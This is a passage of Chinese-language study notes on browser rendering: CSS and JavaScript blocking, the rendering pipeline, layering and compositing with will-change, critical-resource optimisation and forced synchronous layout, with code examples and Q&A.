该示例中，JavaScript 代码出现了 `div1.style.color = ‘red'` 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。

而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，都会执行 CSS 文件下载，解析操作，再执行 JavaScript 脚本。

所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。

通过上面的分析，我们知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞 JavaScript 的执行，所以在实际的工程中需要重点关注 JavaScript 文件和样式表文件，使用不当会影响到页面性能的。

渲染引擎还有一个安全检查模块叫 XSSAuditor，是用来检测词法安全的。在分词器解析出来 Token 之后，它会检测这些模块是否安全，比如是否引用了外部脚本，是否符合 CSP 规范，是否存在跨站点请求等。如果出现不符合规范的内容，XSSAuditor 会对该脚本或者下载任务进行拦截。

问题：打开这个 HTML 页面，页面显示的内容是什么？

```html
<html>
  <body>
    <div>1</div>
    <script>
      let div1 = document.getElementsByTagName('div')[0];
      div1.innerText = 'time.geekbang';

      let div2 = document.getElementsByTagName('div')[1];
      div2.innerText = 'time.geekbang.com';
    </script>
    <div>test</div>
  </body>
</html>
```

会显示 time.geekbang 和 test，JavaScript 代码执行的时候第二个 div 还没有生成 DOM 节点，所以是获取不到 div2 的，页面会报错 Uncaught TypeError: Cannot set property 'innerText' of undefined。

另外复习了下 async 和 defer：

async：脚本并行加载，加载完成之后立即执行，执行时机不确定，仍有可能阻塞 HTML 解析，执行时机在 load 事件派发之前

defer：脚本并行加载，等待 HTML 解析完成之后，按照加载顺序执行脚本，执行时机在 DOMContentLoaded 事件派发之前

CSS 不阻塞 dom 的生成。 CSS 不阻塞 js 的加载，但是会阻塞 js 的执行。 js 会阻塞 dom 的生成，也就是会阻塞页面的渲染，那么 css 也有可能会阻塞页面的渲染。如果把 CSS 放在文档的最后面加载执行，CSS 不会阻塞 DOM 的生成，也不会阻塞 JS，但是浏览器在解析完 DOM 后，要花费额外时间来解析 CSS，而不是在解析 DOM 的时候，并行解析 CSS。并且浏览器会先渲染出一个没有样式的页面，等 CSS 加载完后会再渲染成一个有样式的页面，页面会出现明显的闪动的现象。所以应该把 CSS 放在文档的头部，尽可能的提前加载 CSS；把 JS 放在文档的尾部，这样 JS 也不会阻塞页面的渲染。CSS 会和 JS 并行解析，CSS 解析也尽可能的不去阻塞 JS 的执行，从而使页面尽快的渲染完成。

问：主线程在 parseHtml 时，是不是没办法执行执行 paint 等操作、那这时候页面又是如何绘制出来的呀？

答：如果正在执行 ParserHTML，那么页面只会显示之前绘制好的内容，举个极端点的例子，比如 ParserHTML 占用了主线程 10 秒，那么这 10 秒内，页面都不会发生新的绘制操作，也就是页面卡顿了 10 秒！

## 渲染流水线

**CSS 如何影响首次加载时的白屏时间？**

**只含有外部 CSS 文件代码的页面渲染流水线**

```css
//theme.css
div {
  color: coral;
  background-color: black;
}
```

```html
<html>
  <head>
    <link href="theme.css" rel="stylesheet" />
  </head>
  <body>
    <div>geekbang com</div>
  </body>
</html>
```

打开这段 HTML 文件时的渲染流水线：

![image-20220512233227963](.\typora-user-images\image-20220512233227963.png)

首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。这里你需要特别注意下，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。

当渲染进程接收 HTML 文件字节流时，会先开启一个预解析线程，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间需要你注意一下，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。

**那渲染流水线为什么需要 CSSOM 呢？**

和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，

第一个是提供给 JavaScript 操作样式表的能力，

第二个是为布局树的合成提供基础的样式信息。

这个 CSSOM 体现在 DOM 中就是 document.styleSheets。

等 DOM 和 CSSOM 都构建好之后，渲染引擎就会构造布局树。布局树的结构基本上就是复制 DOM 树的结构，不同之处在于 DOM 树中那些不需要显示的元素会被过滤掉，如 display:none 属性的元素、head 标签、script 标签等。复制好基本的布局树结构之后，渲染引擎会为对应的 DOM 元素选择对应的样式信息，这个过程就是样式计算。样式计算完成之后，渲染引擎还需要计算布局树中每个元素对应的几何位置，这个过程就是计算布局。通过样式计算和计算布局就完成了最终布局树的构建。 然后才是生成 layer tree 再是生成绘制列表，绘制等操作。

**含有外部 CSS 文件和 JavaScript 代码的页面渲染流水线**

```css
//theme.css
div {
  color: coral;
  background-color: black;
}
```

```html
<html>
  <head>
    <link href="theme.css" rel="stylesheet" />
  </head>
  <body>
    <div>geekbang com</div>
    <script>
      console.log('time.geekbang.org');
    </script>
    <div>geekbang com</div>
  </body>
</html>
```

![img](https://static001.geekbang.org/resource/image/f8/1c/f85f8778f273710ca559a52027ed731c.png)

在解析 DOM 的过程中，如果遇到了 JavaScript 脚本，那么需要先暂停 DOM 解析去执行 JavaScript，因为 JavaScript 有可能会修改当前状态下的 DOM。

不过在执行 JavaScript 脚本之前，如果页面中包含了外部 CSS 文件的引用，或者通过 style 标签内置了 CSS 内容，那么渲染引擎还需要将这些内容转换为 CSSOM，因为 JavaScript 有修改 CSSOM 的能力，所以在执行 JavaScript 之前，还需要依赖 CSSOM。也就是说 **CSS 在部分情况下也会阻塞 DOM 的生成**。

**在 body 中被包含的是 JavaScript 外部引用文件和外部 CSS 文件**

```css
//theme.css
div {
  color: coral;
  background-color: black;
}
```

```js
//foo.js
console.log('time.geekbang.org');
```

```html
<html>
  <head>
    <link href="theme.css" rel="stylesheet" />
  </head>
  <body>
    <div>geekbang com</div>
    <script src="foo.js"></script>
    <div>geekbang com</div>
  </body>
</html>
```

![img](https://static001.geekbang.org/resource/image/76/1f/7641c75a80133e747aa2faae8f4c8d1f.png)

在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。

后面的流水线就和前面是一样的了，不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。

### 影响页面展示的因素以及优化策略

渲染流水线影响到了首次页面展示的速度。

从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段：

- 第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。

- 第二个阶段，提交数据之后渲染进程会创建一个空白页面，我们通常把这段时间称为解析白屏，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。

- 第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。

影响第一个阶段的因素主要是网络或者是服务器处理。

重点关注第二个阶段，这个阶段的主要问题是白屏时间，为了缩短白屏时间，挨个分析这个阶段的主要任务，包括了解析 HTML、下载 CSS、下载 JavaScript、生成 CSSOM、执行 JavaScript、生成布局树、绘制页面一系列操作。

通常情况下的瓶颈主要体现在下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript。

所以要想缩短白屏时长，可以有以下策略：

- 通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。
- 但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。
- 还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 async 或者 defer。
- 对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。

问：当你横屏方向拿着一个手机时，打开一个页面，观察下面几种资源的加载方式，你认为哪几种会阻塞页面渲染？为什么？

```html
<script src="foo.js" type="text/javascript"></script>
<script defer src="foo.js" type="text/javascript"></script>
<script sync src="foo.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="foo.css" />
<link rel="stylesheet" type="text/css" href="foo.css" media="screen" />
<link rel="stylesheet" type="text/css" href="foo.css" media="print" />
<link rel="stylesheet" type="text/css" href="foo.css" media="orientation:landscape" />
<link rel="stylesheet" type="text/css" href="foo.css" media="orientation:portrait" />
```

答：

第 1 条：下载 JavaScript 文件并执行同步代码，会阻塞页面渲染

第 2 条：defer 异步下载 JavaScript 文件，会在 HTML 解析完成之后执行，不会阻塞页面渲染

第 3 条：sync 异步下载 JavaScript 文件，下载完成之后会立即执行，有可能会阻塞页面渲染

第 4 条：下载 CSS 文件，可能阻塞页面渲染

第 5 条：media 属性用于区分设备，screen 表示用于有屏幕的设备，无法用于打印机、3D 眼镜、盲文阅读机等，在题设手机条件下，会加载，与第 4 条一致，可能阻塞页面渲染

第 6 条：print 用于打印预览模式或打印页面，这里不会加载，不会阻塞页面渲染

第 7 条：orientation:landscape 表示横屏，与题设条件一致，会加载，与第 4 条一致，可能阻塞页面渲染

第 8 条：orientation:portrait 表示竖屏，这里不会加载，不会阻塞页面渲染

会阻塞页面的有 1、3、4、5、7。我这里的问题在于是否加载 CSS 文件和 JavaScript 文件时，CSS 文件一定会阻塞 JavaScript 代码的执行，还是说在 JavaScript 脚本需要使用到 CSSOM 能力的时候才会有这个前置依赖

## 分层和合成机制

为什么 CSS 动画比 JavaScript 高效？

DOM 树生成之后，还要经历布局、分层、绘制、合成、显示等阶段后才能显示出页面。

讲解渲染引擎的分层和合成机制，深刻地理解 CSS 动画和 JavaScript 底层工作机制。

### 显示器是怎么显示图像的

每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫前缓冲区的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。

显卡的作用：合成新的图像，并将图像保存到后缓冲区中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。

### 帧和帧率

当你通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以你能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。

大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。

把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。

如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿。

要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。分层和合成机制代表了当今最先进的渲染技术，所以接下来我们就来分析下什么是合成和渲染技术。

### 如何生成一帧图像

渲染引擎是如何生成一帧图像的？

关于渲染流水线中任意一帧的生成方式，有重排、重绘和合成三种方式。

这三种方式的渲染路径是不同的，通常渲染路径越长，生成图像花费的时间就越多。比如重排，它需要重新根据 CSSOM 和 DOM 来计算布局树，这样生成一幅图片时，会让整个渲染流水线的每个阶段都执行一遍，如果布局复杂的话，就很难保证渲染的效率了。而重绘因为没有了重新布局的阶段，操作效率稍微高点，但是依然需要重新计算绘制信息，并触发绘制操作之后的一系列操作。

相较于重排和重绘，合成操作的路径就显得非常短了，并不需要触发布局和绘制两个阶段，如果采用了 GPU，那么合成的效率会非常高。

所以，关于渲染引擎生成一帧图像的几种方式，按照效率我们推荐合成方式优先，若实在不能满足需求，那么就再退后一步使用重绘或者重排的方式。

本文我们的焦点在合成上，所以接下来我们就来深入分析下 Chrome 浏览器是怎么实现合成操作的。Chrome 中的合成技术，可以用三个词来概括总结：**分层、分块和合成**。

### 分层和合成

如果没有采用分层机制，从布局树直接生成目标图片的话，那么每次页面有很小的变化时，都会触发重排或者重绘机制，这种“牵一发而动全身”的绘制策略会严重影响页面的渲染效率。

**为了提升每帧的渲染效率，Chrome 引入了分层和合成的机制。那该怎么来理解分层和合成机制呢？**

可以把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。在这个过程中，将素材分解为多个图层的操作就称为分层，最后将这些图层合并到一起的操作就称为合成。所以，分层和合成通常是一起使用的。

考虑到一个页面被划分为两个层，当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。

**Chrome 是怎么实现分层和合成机制？**

在 Chrome 的渲染流水线中，分层体现在生成布局树之后，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。

层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。

绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成|Paint BackGroundColor:Black | Paint Circle|这样的绘制指令列表，绘制过程就完成了。

有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。

**需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的。**这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。

### 分块

如果说分层是从宏观上提升了渲染效率，那么分块则是从微观层面提升了渲染效率。

通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。

因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——**纹理上传**，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。

为了解决这个问题，Chrome 又采取了一个策略：在首次合成图块的时候使用一个低分辨率的图片。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好。

### 利用分层技术优化代码

在写 Web 应用的时候，你可能经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。这时你可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：

```css
.box {
  will-change: transform, opacity;
}
```

这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一个个图层，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。这也是 CSS 动画比 JavaScript 动画高效的原因。

所以，如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存，所以你需要恰当地使用 will-change。

问题：

观察下面代码，结合 Performance 面板、内存面板和分层面板，全面比较在 box 中使用 will-change 和不使用 will-change 的效率、性能和内存占用等情况。

```html
<html>
  <head>
    <title>观察will-change</title>
    <style>
      .box {
        will-change: transform, opacity;
        display: block;
        float: left;
        width: 40px;
        height: 40px;
        margin: 15px;
        padding: 10px;
        border: 1px solid rgb(136, 136, 136);
        background: rgb(187, 177, 37);
        border-radius: 30px;
        transition: border-radius 1s ease-out;
      }

      body {
        font-family: Arial;
      }
    </style>
  </head>

  <body>
    <div id="controls">
      <button id="start">start</button>
      <button id="stop">stop</button>
    </div>
    <div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
      <div class="box">旋转盒子</div>
    </div>
    <script>
      let boxes = document.querySelectorAll('.box');
      let boxes1 = document.querySelectorAll('.box1');
      let start = document.getElementById('start');
      let stop = document.getElementById('stop');
      let stop_flag = false;

      start.addEventListener('click', function () {
        stop_flag = false;
        requestAnimationFrame(render);
      });

      stop.addEventListener('click', function () {
        stop_flag = true;
      });

      let rotate_ = 0;
      let opacity_ = 0;
      function render() {
        if (stop_flag) return 0;
        rotate_ = rotate_ + 6;
        if (opacity_ > 1) opacity_ = 0;
        opacity_ = opacity_ + 0.01;
        let command = 'rotate(' + rotate_ + 'deg)';
        for (let index = 0; index < boxes.length; index++) {
          boxes[index].style.transform = command;
          boxes[index].style.opacity = opacity_;
        }
        requestAnimationFrame(render);
      }
    </script>
  </body>
</html>
```

问：既然 css 动画会跳过重绘阶段，则意味着合成阶段的绘制列表不会变化。但是最终得到的相邻两帧的位图是不一样的。那么在合成阶段，相同的绘制列表是如何绘制出不同的位图的？难道绘制列表是有状态的？还是绘制列表一次能绘制出多张位图？

答：记住一点，能直接在合成线程中完成的任务都不会改变图层的内容，如文字信息的改变，布局的改变，颜色的改变，统统不会涉及，涉及到这些内容的变化就要牵涉到重排或者重绘了。 能直接在合成线程中实现的是整个图层的几何变换，透明度变换，阴影等，这些变换都不会影响到图层的内容。 比如滚动页面的时候，整个页面内容没有变化，这时候做的其实是对图层做上下移动，这种操作直接在合成线程里面就可以完成了。 再比如文章题目列子中的旋转操作，如果样式里面使用了 will-change ，那么这些 box 元素都会生成单独的一层，那么在旋转操作时，只要在合成线程将这些 box 图层整体旋转到设置的角度，再拿旋转后的 box 图层和背景图层合成一张新图片，这个图片就是最终输出的一帧，整个过程都是在合成线程中实现的。

问：这篇文章信息量巨大，需要很多的知识储备，老师能不能提供一些课外阅读帮助理解？

答：这块资料比较少，都是通过 chromium 源码还有 blinkon 上一些视频总结的。 blinkon：https://www.youtube.com/channel/UCIfQb9u7ALnOE4ZmexRecDg Chromium 源码： https://chromium.googlesource.com/chromium/src https://chromium.googlesource.com/chromium/src/+/master/docs/README.md 不过源码看起来会比较吃力，里面充斥着大量的回调，梳理起来也是非常不轻松的

答：关于 css 动画和 js 动画效率的问题应该有点武断了，will-change 只是优化手段，使用 js 改变 transform 也能享受这个属性带来的优化。既然 css 动画和 js 动画都能享受这个优化，那就不能说明 css 动画比 js 动画效率高。

## 页面性能

如何系统地优化页面？

一个页面的展示有三个阶段：

- **加载阶段**：指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。
- **交互阶段**：指从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。
- **关闭阶段**：指用户发出关闭指令后页面所做的一些清理操作。

**重点关注加载阶段和交互阶段**

### 优化加载阶段

![image-20220513210622816](.\typora-user-images\image-20220513210622816.png)

并非所有的资源都会阻塞页面的首次绘制，比如图片、音频、视频等文件就不会阻塞页面的首次渲染；而 JavaScript、首次请求的 HTML 资源文件、CSS 文件是会阻塞首次渲染的，因为在构建 DOM 的过程中需要 HTML 和 JavaScript 文件，在构造渲染树的过程中需要用到 CSS 文件。

**这些能阻塞网页首次渲染的资源称为关键资源**。

影响页面首次渲染的核心因素：

- **关键资源个数**，关键资源个数越多，首次页面的加载时间就会越长。
- **关键资源大小**，通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。
- **请求关键资源需要多少个 RTT（Round Trip Time）**，当使用 TCP 协议传输一个文件时，这个数据并不是一次传输到服务端的，而是需要拆分成一个个数据包来回多次进行传输的。**RTT 就是这里的往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延**。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。

结合上图来看看它的关键资源请求需要多少个 RTT。首先是请求 HTML 资源，大小是 6KB，小于 14KB，所以 1 个 RTT 就可以解决了。至于 JavaScript 和 CSS 文件，这里需要注意一点，由于渲染引擎有一个预解析的线程，在接收到 HTML 数据之后，预解析线程会快速扫描 HTML 数据中的关键资源，一旦扫描到了，会立马发起请求，你可以认为 JavaScript 和 CSS 是同时发起请求的，所以它们的请求是重叠的，那么计算它们的 RTT 时，只需要计算体积最大的那个数据就可以了。这里最大的是 CSS 文件（9KB），所以我们就按照 9KB 来计算，同样由于 9KB 小于 14KB，所以 JavaScript 和 CSS 资源也就可以算成 1 个 RTT。也就是说，上图中关键资源请求共花费了 2 个 RTT。

优化方案：

**总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数**。

- 减少关键资源的个数，一种方式是可以将 JavaScript 和 CSS 改成内联的形式，另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 sync 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 sync 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。
- 减少关键资源，可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。
- 减少关键资源 RTT 的次数，可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。

在优化实际的页面加载速度时，你可以先画出优化之前关键资源的图表，然后按照上面优化关键资源的原则去优化，优化完成之后再画出优化之后的关键资源图表。

### 优化交互阶段

谈交互阶段的优化，其实就是在谈渲染进程渲染帧的速度，因为在交互阶段，帧的渲染速度决定了交互的流畅度。

讨论页面优化实际上就是讨论渲染引擎是如何渲染帧的，否则就无法优化帧率。

交互阶段的渲染流水线（如下图）

![img](https://static001.geekbang.org/resource/image/4a/0c/4a942e53f9358c9c4634c310335cc10c.png)

和加载阶段的渲染流水线有一些不同的地方是，在交互阶段没有了加载关键资源和构建 DOM、CSSOM 流程，通常是由 JavaScript 触发交互动画的。

交互阶段是如何生成一个帧的？大部分情况下，生成一个新的帧都是由 JavaScript 通过修改 DOM 或者 CSSOM 来触发的。还有另外一部分帧是由 CSS 来触发的。

如果在计算样式阶段发现有布局信息的修改，那么就会触发**重排**操作，然后触发后续渲染流水线的一系列操作，这个代价是非常大的。

如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜色一类的信息，那么就不会涉及到布局相关的调整，所以可以跳过布局阶段，直接进入绘制阶段，这个过程叫**重绘**。不过重绘阶段的代价也是不小的。

通过 CSS 实现一些变形、渐变、动画等特效，这是由 CSS 触发的，并且是在合成线程上执行的，这个过程称为合成。因为它不会触发重排或者重绘，而且合成操作本身的速度就非常快，所以执行合成是效率最高的方式。

优化方案：

**一个大的原则就是让单个帧的生成速度变快**。（不影响单帧的生成速度）

1. 减少 JavaScript 脚本执行时间（在交互阶段，对 JavaScript 脚本总的原则就是不要一次霸占太久主线程）有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。针对这种情况我们可以采用以下两种策略：

   - 一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。
   - 另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。

2. 避免强制同步布局通过 DOM 接口执行添加元素或者删除元素等操作后，是需要重新计算样式和布局的，不过正常情况下这些操作都是在另外的任务中异步完成的，这样做是为了避免当前的任务占用太长的主线程时间。

   ```html
   <html>
     <body>
       <div id="mian_div">
         <li id="time_li">time</li>
         <li>geekbang</li>
       </div>

       <p id="demo">强制布局 demo</p>
       <button onclick="foo()">添加新元素</button>

       <script>
         function foo() {
           let main_div = document.getElementById('mian_div');
           let new_node = document.createElement('li');
           let textnode = document.createTextNode('time.geekbang');
           new_node.appendChild(textnode);
           document.getElementById('mian_div').appendChild(new_node);
         }
       </script>
     </body>
   </html>
   ```

   对于上面这段代码，我们可以使用 Performance 工具来记录添加元素的过程，如下图所示：

![image-20220513230942437](.\typora-user-images\image-20220513230942437.png)

从图中可以看出来，执行 JavaScript 添加元素是在一个任务中执行的，重新计算样式布局是在另外一个任务中执行，这就是正常情况下的布局操作。

**强制同步布局:**

**所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中**。为了直观理解，这里我们对上面的代码做了一点修改，让它变成强制同步布局，修改后的代码如下所示：

```js
function foo() {
  let main_div = document.getElementById('mian_div');
  let new_node = document.createElement('li');
  let textnode = document.createTextNode('time.geekbang');
  new_node.appendChild(textnode);
  document.getElementById('mian_div').appendChild(new_node);
  // 由于要获取到 offsetHeight，
  // 但是此时的 offsetHeight 还是老的数据，
  // 所以需要立即执行布局操作
  console.log(main_div.offsetHeight);
}
```

将新的元素添加到 DOM 之后，我们又调用了`main_div.offsetHeight`来获取新 main_div 的高度信息。如果要获取到 main_div 的高度，就需要重新布局，所以这里在获取到 main_div 的高度之前，JavaScript 还需要强制让渲染引擎默认执行一次布局操作。我们把这个操作称为强制同步布局。

可以看下面通过 Performance 记录的任务状态：

![image-20220513231401163](.\typora-user-images\image-20220513231401163.png)

从上图可以看出来，计算样式和布局都是在当前脚本执行过程中触发的，这就是强制同步布局。

为了避免强制同步布局，我们可以调整策略，在修改 DOM 之前查询相关值。代码如下所示：

```js
function foo() {
  let main_div = document.getElementById('mian_div');
  // 为了避免强制同步布局，在修改 DOM 之前查询相关值
  console.log(main_div.offsetHeight);
  let new_node = document.createElement('li');
  let textnode = document.createTextNode('time.geekbang');
  new_node.appendChild(textnode);
  document.getElementById('mian_div').appendChild(new_node);
}
```

3. 避免布局抖动所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。

   ```js
   function foo() {
     let time_li = document.getElementById('time_li');
     for (let i = 0; i < 100; i++) {
       let main_div = document.getElementById('mian_div');
       let new_node = document.createElement('li');
       let textnode = document.createTextNode('time.geekbang');
       new_node.appendChild(textnode);
       new_node.offsetHeight = time_li.offsetHeight;
       document.getElementById('mian_div').appendChild(new_node);
     }
   }
   ```

   我们在一个 for 循环语句里面不断读取属性值，每次读取属性值之前都要进行计算样式和布局。执行代码之后，使用 Performance 记录的状态如下所示：

